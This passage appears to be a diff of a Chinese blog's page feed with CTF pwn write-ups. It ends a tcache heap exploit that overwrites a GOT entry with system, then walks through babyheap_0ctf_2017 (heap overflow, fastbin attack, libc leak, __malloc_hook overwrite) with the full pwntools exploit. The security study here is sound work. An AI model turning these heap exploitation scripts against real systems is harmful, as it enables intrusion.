io.sendafter(&#x27;name: &#x27;, name)</span><br><span class="line">  io.sendafter(&#x27;remark: &#x27;, remark)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def fill(index,name):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name is: &#x27;, name)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload1 = &#x27;\x00&#x27;</span><br><span class="line">payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)</span><br><span class="line">delete(0)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">delete(1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = p64(heap_addr + 0x290)</span><br><span class="line">fill(1,payload)</span><br><span class="line">alloc(2,payload1,payload2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="x05-总结">0x05 总结</h1>
+<p>这题太遗憾了...最后也没做出来。不过做一窍不通的题收获才最大。<br />
+做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br />
+对tcachebin的第一印象如下:<br />
+1. 概述<br />
+1. 0x10~0x410（貌似是）的chunk 2. LIFO 3.
+大小只有7，free满以后再free就会放到对应的其他bin中 4.
+2.28及以下的libc不检测double free 2. 伪造chunk 1.
+安全性比fastbin还差，不检验fd指向chunk的size直接申请 3. leak堆地址 1.
+2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry
+目前就想到这些，这次多亏队友带飞，进半决赛了XD</p>
 ]]></content>
       <categories>
         <category>Pwn</category>
@@ -169,91 +127,101 @@ baby一点都不baby...houseoforange+unsortedbinattack
     <content><![CDATA[<blockquote class="blockquote-center">
 第一道Heap，插个里程碑纪念一下XD
 </blockquote>
-
 <span id="more"></span>
-<h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h1><p>七月学完栈溢出，ak掉buu前两页的所有栈题<br>八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br>参加了个数据安全的夏令营<br>给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br>给SecretFlow审了一点go语言的洞<br>然后用C#和xaml给sdu校园网写了个一键修复脚本<br>总而言之学的很杂…说实话真不如多打点比赛。<br>本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了…<br>总而言之还是脚踏实地学一点算一点吧<br>还有个南大PA的坑等着我去填呢…才刚把nemu的gdb实现了个单步步入…  </p>
-<hr>
-<h1 id="0x01-babyheap-0ctf-2017"><a href="#0x01-babyheap-0ctf-2017" class="headerlink" title="0x01 babyheap_0ctf_2017"></a>0x01 babyheap_0ctf_2017</h1><blockquote>
-<p>做完这道题才算真正意义上的AK第一页XD</p>
-<h3 id="Ⅰ-主要知识点"><a href="#Ⅰ-主要知识点" class="headerlink" title="Ⅰ. 主要知识点"></a>Ⅰ. 主要知识点</h3><ol>
-<li>堆溢出</li>
-</ol>
+<h1 id="x00-写在前面">0x00 写在前面</h1>
+<p>七月学完栈溢出，ak掉buu前两页的所有栈题<br />
+八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br />
+参加了个数据安全的夏令营<br />
+给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br />
+给SecretFlow审了一点go语言的洞<br />
+然后用C#和xaml给sdu校园网写了个一键修复脚本<br />
+总而言之学的很杂...说实话真不如多打点比赛。<br />
+本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...<br />
+总而言之还是脚踏实地学一点算一点吧<br />
+还有个南大PA的坑等着我去填呢...才刚把nemu的gdb实现了个单步步入...</p>
+<hr />
+<h1 id="x01-babyheap_0ctf_2017">0x01 babyheap_0ctf_2017</h1>
+<blockquote>
+<p>做完这道题才算真正意义上的AK第一页XD ### Ⅰ. 主要知识点 1. 堆溢出</p>
 </blockquote>
-<h3 id="Ⅱ-解题步骤"><a href="#Ⅱ-解题步骤" class="headerlink" title="Ⅱ. 解题步骤"></a>Ⅱ. 解题步骤</h3><ol>
-<li><p>checksec 保护全开<br><img src="/pic/Pasted image 20230814133847.png" alt=""></p>
-</li>
-<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br><img src="/pic/Pasted image 20230814134313.png" alt=""><br><img src="/pic/Pasted image 20230814134623.png" alt=""><br>注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p>
-</li>
+<h3 id="解题步骤">Ⅱ. 解题步骤</h3>
+<ol type="1">
+<li><p>checksec 保护全开<br />
+<img src="/pic/Pasted%20image%2020230814133847.png" /></p></li>
+<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下<br />
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
+<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br />
+<img src="/pic/Pasted%20image%2020230814134313.png" /> <img
+src="/pic/Pasted%20image%2020230814134623.png" />
+注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p></li>
 <li><p>IDA分析可知，我们可以有以下思路：</p>
-<ol>
+<ol type="1">
 <li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
-<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址<ol>
-<li>要泄露libc地址，肯定要读存有libc地址的地址<ol>
-<li>哪里存着libc地址？unsorted bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
+<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址
+<ol type="1">
+<li>要泄露libc地址，肯定要读存有libc地址的地址
+<ol type="1">
+<li>哪里存着libc地址？unsorted
+bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
 <li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
-</ol>
-</li>
-</ol>
-</li>
+</ol></li>
+</ol></li>
 <li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
-</ol>
-</li>
-<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure>
-<p>此时堆的情况如下<br><img src="/pic/Pasted image 20230814140742.png" alt=""></p>
-</li>
-<li><p>Free掉index为1和2的chunk，给后面alloc留出空间</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
-<p>heap情况如下<br><img src="/pic/Pasted image 20230814141436.png" alt=""><br>bin情况如下<br><img src="/pic/Pasted image 20230814141724.png" alt=""></p>
-</li>
+</ol></li>
+<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted
+bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin
+chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure> 此时堆的情况如下 <img
+src="/pic/Pasted%20image%2020230814140742.png" /></p></li>
+<li><p>Free掉index为1和2的chunk，给后面alloc留出空间 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
+heap情况如下 <img src="/pic/Pasted%20image%2020230814141436.png" />
+bin情况如下 <img
+src="/pic/Pasted%20image%2020230814141724.png" /></p></li>
 <li><p>堆溢出，操控fastbin</p>
-<ol>
-<li>现在是main_arena_fastbin_0x20 —-&gt; chunk2 —-&gt;chunk1</li>
-<li>我们想办法让它变成 xxx_0x20 —-&gt; chunk2 —-&gt;chunk4<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br></pre></td></tr></table></figure>
+<ol type="1">
+<li>现在是main_arena_fastbin_0x20 ---&gt; chunk2 ---&gt;chunk1</li>
+<li>我们想办法让它变成 xxx_0x20 ---&gt; chunk2 ---&gt;chunk4
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br></pre></td></tr></table></figure>
 （这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
-</ol>
-</li>
-<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure>
-<p>heap情况如下<br><img src="/pic/Pasted image 20230814143302.png" alt=""></p>
-</li>
-<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来。这个地址是main_arena+88，打开libc可以看到main_arena的地址为0x3c4b20，所以我们获得的libc_addr需要减88再减0x3c4b20，即减去0x3C4B78<br><img src="/pic/Pasted image 20230814144704.png" alt=""></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来在malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方<br><img src="/pic/Pasted image 20230814145721.png" alt=""><br>发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br>⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-</li>
+</ol></li>
+<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure> heap情况如下 <img
+src="/pic/Pasted%20image%2020230814143302.png" /></p></li>
+<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来。这个地址是main_arena+88，打开libc可以看到main_arena的地址为0x3c4b20，所以我们获得的libc_addr需要减88再减0x3c4b20，即减去0x3C4B78
+<img src="/pic/Pasted%20image%2020230814144704.png" />
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure></p></li>
+<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来在malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方
+<img src="/pic/Pasted%20image%2020230814145721.png" />
+发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br />
+⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p></li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x60)                                    # 将unsortedbin中的chunk4切0x60大小申请出来</span><br><span class="line">free(4)                                        # 把chunk4放到fastbin中，便于用pointer_chunk2操控</span><br><span class="line">payload = p64(libc_base+0x3c4aed)              # 把申请块写进malloc_hook前面</span><br><span class="line">fill(2,payload)                                # 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span><br><span class="line">alloc(0x60)                                    # 把chunk4申请回来</span><br><span class="line">alloc(0x60)                                    # 在malloc_hook处构造堆，index=6</span><br></pre></td></tr></table></figure>
-<ol>
-<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(255)</span><br></pre></td></tr></table></figure>
-</li>
+<ol start="13" type="1">
+<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat
+flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(255)</span><br></pre></td></tr></table></figure></p></li>
 </ol>
-<h3 id="Ⅲ-完整EXP"><a href="#Ⅲ-完整EXP" class="headerlink" title="Ⅲ. 完整EXP"></a>Ⅲ. 完整EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25970</span><br><span class="line">file = &#x27;./babyheap_0ctf_2017&#x27;</span><br><span class="line">  </span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">  </span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(1))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  </span><br><span class="line">def fill(index, content):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(2))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(len(content)))</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(3))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;,str(index))</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(4))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(255)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="Ⅳ-一些疑问"><a href="#Ⅳ-一些疑问" class="headerlink" title="Ⅳ. 一些疑问"></a>Ⅳ. 一些疑问</h3><ol>
-<li>__malloc_hook不是在data段中吗？这题开了FULL RELRO为什么可以改啊🤔</li>
+<h3 id="完整exp">Ⅲ. 完整EXP</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25970</span><br><span class="line">file = &#x27;./babyheap_0ctf_2017&#x27;</span><br><span class="line">  </span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">  </span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(1))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  </span><br><span class="line">def fill(index, content):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(2))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(len(content)))</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(3))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;,str(index))</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(4))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(255)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="一些疑问">Ⅳ. 一些疑问</h3>
+<ol type="1">
+<li>__malloc_hook不是在data段中吗？这题开了FULL
+RELRO为什么可以改啊🤔</li>
 <li>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</li>
-<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？<ol>
+<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？
+<ol type="1">
 <li>unsortedbin，后向合并</li>
-</ol>
-</li>
-<li><strong><em>为什么非要在aed处申请堆块？</em></strong><ol>
+</ol></li>
+<li><strong><em>为什么非要在aed处申请堆块？</em></strong>
+<ol type="1">
 <li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
-</ol>
-</li>
+</ol></li>
 </ol>
 ]]></content>
       <categories>
@@ -269,82 +237,83 @@ baby一点都不baby...houseoforange+unsortedbinattack
     <content><![CDATA[<blockquote class="blockquote-center">
 学习还是要写点日志才有意思
 </blockquote>
-
 <span id="more"></span>
-<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><blockquote>
+<h2 id="说在前面">说在前面</h2>
+<blockquote>
 <p>关于博客</p>
 </blockquote>
